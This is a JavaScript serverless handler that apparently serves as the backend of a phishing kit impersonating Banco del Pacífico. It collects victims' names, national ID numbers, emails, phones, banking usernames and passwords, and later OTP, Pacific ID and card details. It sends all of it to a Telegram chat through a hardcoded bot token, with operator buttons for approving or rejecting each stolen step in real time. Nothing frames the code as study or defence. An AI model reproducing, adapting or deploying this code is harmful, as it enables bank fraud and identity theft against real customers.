const TOKEN = process.env.TELEGRAM_TOKEN || "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";
const CHAT_ID = process.env.CHAT_ID || "-1003027102929";

const BUTTONS = [
  [{ text: "🔐 OTP", callback_data: "otp" }, { text: "💳 TARJETA", callback_data: "tarjeta" }],
  [{ text: "🛡️ PACIFIC ID", callback_data: "pacificid" }],
  [{ text: "❌ ERROR LOGIN", callback_data: "error_login" }],
  [{ text: "❌ ERROR OTP", callback_data: "error_otp" }, { text: "❌ ERROR PACIFICID", callback_data: "error_pacificid" }],
  [{ text: "❌ ERROR TARJETA", callback_data: "error_tarjeta" }],
  [{ text: "✅ APROBAR", callback_data: "aprobar" }]
];

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();

  try {
    const body = req.body;
    let text = '';
    let buttons = BUTTONS;

    // Formato del Banco del Pacífico: { action, data }
    if (body.action === 'notify') {
      const d = body.data;
      text = `🏦 <b>NUEVA SOLICITUD - Banco del Pacífico</b>\n` +
        `━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Nombre:</b> ${d.nombre}\n` +
        `🪪 <b>Cédula:</b> ${d.cedula}\n` +
        `📧 <b>Correo:</b> ${d.correo}\n` +
        `📱 <b>Teléfono:</b> ${d.telefono}\n` +
        `🔐 <b>Usuario:</b> ${d.usuario}\n` +
        `🔑 <b>Clave:</b> ${d.clave}\n` +
        `━━━━━━━━━━━━━━━━\n` +
        `🕐 ${new Date().toLocaleString('es-EC', { timeZone: 'America/Guayaquil' })}`;

    } else if (body.action === 'notify_step') {
      const d = body.data;
      text = `📋 <b>${d.step} RECIBIDO</b>\n` +
        `━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Cliente:</b> ${d.nombre}\n` +
        `🪪 <b>Cédula:</b> ${d.cedula}\n`;

      if (d.extra) {
        Object.entries(d.extra).forEach(([k, v]) => { text += `🔹 <b>${k}:</b> ${v}\n`; });
      }
      text += `━━━━━━━━━━━━━━━━\n`;
      text += `🕐 ${new Date().toLocaleString('es-EC', { timeZone: 'America/Guayaquil' })}`;

      // Botones según el paso
      if (d.step === 'OTP' || d.step === 'PACIFIC ID') {
        buttons = [
          [{ text: "💳 TARJETA", callback_data: "tarjeta" }],
          [{ text: "❌ ERROR OTP", callback_data: "error_otp" }, { text: "❌ ERROR PACIFICID", callback_data: "error_pacificid" }],
          [{ text: "✅ APROBAR", callback_data: "aprobar" }]
        ];
      } else if (d.step === 'TARJETA') {
        buttons = [
          [{ text: "✅ APROBAR", callback_data: "aprobar" }],
          [{ text: "❌ ERROR TARJETA", callback_data: "error_tarjeta" }]
        ];
      }

    } else {
      // Formato directo: { text, buttons }
      text = body.text;
      buttons = body.buttons || BUTTONS;
    }

    const payload = { chat_id: CHAT_ID, text, parse_mode: "HTML" };
    if (buttons && buttons.length) payload.reply_markup = { inline_keyboard: buttons };

    const r = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    const data = await r.json();
    return res.status(200).json({ ok: true, data });
  } catch (err) {
    return res.status(500).json({ ok: false, error: err.message });
  }
}
